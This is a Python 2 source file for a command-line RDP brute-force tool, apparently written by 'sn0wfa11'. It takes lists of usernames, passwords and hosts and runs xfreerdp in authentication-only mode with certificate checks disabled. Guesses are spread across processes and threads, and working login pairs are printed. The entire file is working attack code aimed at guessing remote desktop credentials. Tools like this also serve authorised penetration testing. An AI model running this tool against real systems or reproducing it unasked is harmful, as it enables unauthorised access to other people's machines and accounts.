#!/usr/bin/env python2

# This is 
#
#
# by sn0wfa11

import sys

try:
  import os
  import socket
  import multiprocessing
  import threading
  import argparse
  import subprocess
  import re
  import time

  from lib.common import *
  from lib.network import *
except Exception, err:
  print >> sys.stderr, err
  sys.exit(1)

usernames = []
passwords = []
hosts = []
ports = []

xfreerdp_path = "/usr/bin/xfreerdp"
rdp_success = "Authentication only, exit status 0"

global verbose, delay, pairwise

# List Import Functions
def get_usernames(filename):
  check_file(filename)
  with open(filename) as user_file:
    for line in user_file:
      line = line.strip()
      if line != "":
        usernames.append(line)

def get_passwords(filename):
  check_file(filename)
  with open(filename) as pass_file:
    for line in pass_file:
      line = line.strip()
      if line != "":
        passwords.append(line)

def get_hosts(filename):
  check_file(filename)
  with open(filename) as host_file:
    for line in host_file:
      split_host_port(line)

def split_host_port(host_input):
  host_port = host_input.split(':')
  host_port = [x.strip() for x in host_port]
  if host_port[0]:
    hosts.append(host_port[0])
    if len(host_port) < 2:
      ports.append(3389)
    else:
      ports.append(int(host_port[1]))

# Get the appropreate number of processes, no need for more than you have hosts
def process_count():
  if len(hosts) < multiprocessing.cpu_count():
    return len(hosts)
  else:
    return multiprocessing.cpu_count()

# Test a single rdp login option
def rdp_connect(host, port, username, password):
  match = False
  rdp = subprocess.Popen([xfreerdp_path, "/v:" + host, "/port:" + str(port), "/u:" + username, "/p:" + password, "/cert-ignore", "+auth-only"], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

  for line in iter(rdp.stderr.readline, ''):
    if re.search(rdp_success, line):
      match = True
      break

  if match:
    print_good("Login found on " + host + " -> " + username + ":" + password)
  else:
    printv_nomatch(username + ":" + password + " no match on " + host)
  pass

# Username and password checking
# Spawns a thread for each combination based on pairwise or not
def check_up(host, port, host_event, host_last):
  if not port_open(host, port):
    print_nomatch("Unable to connect to: " + host + ":" + str(port))
  else:
    up_threads = []
    errored = False

    if pairwise:
      for x in range(0, len(usernames)):
        if not port_open(host, port):
          print_nomatch("Unable to connect to: " + host + ":" + str(port))
          break
        else:
          up_thread = threading.Thread(target=rdp_connect, args=(host, port, usernames[x], passwords[x]))
          time.sleep(0.4)
          up_thread.start()
          up_threads.append(up_thread)

    else:
      for username in usernames:
        for password in passwords:
          if not port_open(host, port):
            errored = True
            break
          else:
            up_thread = threading.Thread(target=rdp_connect, args=(host, port, username, password))
            time.sleep(0.4)
            up_thread.start()
            up_threads.append(up_thread)
        if errored:
          print_nomatch("Unable to connect to: " + host + ":" + str(port))
          break

    for thread in up_threads:
      thread.join()

  if host_last:
    host_event.set()
  pass

# Runs through the host list, multiprocessing by host
def run_hosts():
  host_last = False
  host_pool = multiprocessing.Pool(process_count())
  host_manager = multiprocessing.Manager()
  host_event = host_manager.Event()

  for x in range(0, len(hosts)):
    if hosts[x] == hosts[len(hosts) - 1]:
      host_last = True
    host_pool.apply_async(check_up, (hosts[x], ports[x], host_event, host_last))

  host_pool.close()
  host_event.wait()
  host_pool.terminate()

# Argument parser
def parse_args(args, parser):
  global verbose, delay, pairwise
  verbose = args.verbose
  pairwise = args.pairwise

  if args.host:
    split_host_port(args.host)
  if args.host_file:
    get_hosts(args.host_file)
  if len(hosts) < 1:
    print_exit("You must specify at least one host!", parser)

  if args.username:
    usernames.append(args.username)
  if args.user_file:
    get_usernames(args.user_file)
  if len(usernames) < 1:
    print_exit("You must specify at least one username!", parser)

  if args.password:
    passwords.append(args.password)
  if args.pass_file:
    get_passwords(args.pass_file)
  if len(passwords) < 1:
    print_exit("You must specify at least one password!", parser)

# Main Function
def main(argv):
  parser = argparse.ArgumentParser(description = "RDP login brute forcer.")
  parser.add_argument("-u", "--username", type = str, help = "Single username to test")
  parser.add_argument("-U", "--user_file", type = str, help = "File containing usernames. One per line.")
  parser.add_argument("-p", "--password", type = str, help = "Single password to test")
  parser.add_argument("-P", "--pass_file", type = str, help = "File containing passwords. One per line.")
  parser.add_argument("-t", "--host", type = str, help = "Single host to test. <host> or <host>:<port> IPv6 is ok too.")
  parser.add_argument("-T", "--host_file", type = str, help = "File containing hosts. One per line. <host> or <host>:<port> IPv6 is ok too.")
  parser.add_argument("-v", "--verbose", action = "store_true", help = "Display all host:username:password tests.")
  parser.add_argument("-w", "--pairwise", action = "store_true", help = "Test username and password combos in line by line match. Must have same number of each!")
  
  args = parser.parse_args()
  if len(argv) == 1:
    help_exit(parser)
  parse_args(args, parser)

  print_status("Starting brute force...")

  if pairwise and (len(usernames) != len(passwords)):
    print_error("Username and password numbers do not match in pairwise mode! Exiting...")
    sys.exit(4)

  run_hosts()
  print_status("Done.")

# Ref to main function
if __name__ == "__main__":
  try:
    main(sys.argv)
  except KeyboardInterrupt:
    print "\n\n[*] Exiting..."
    sys.exit(3)
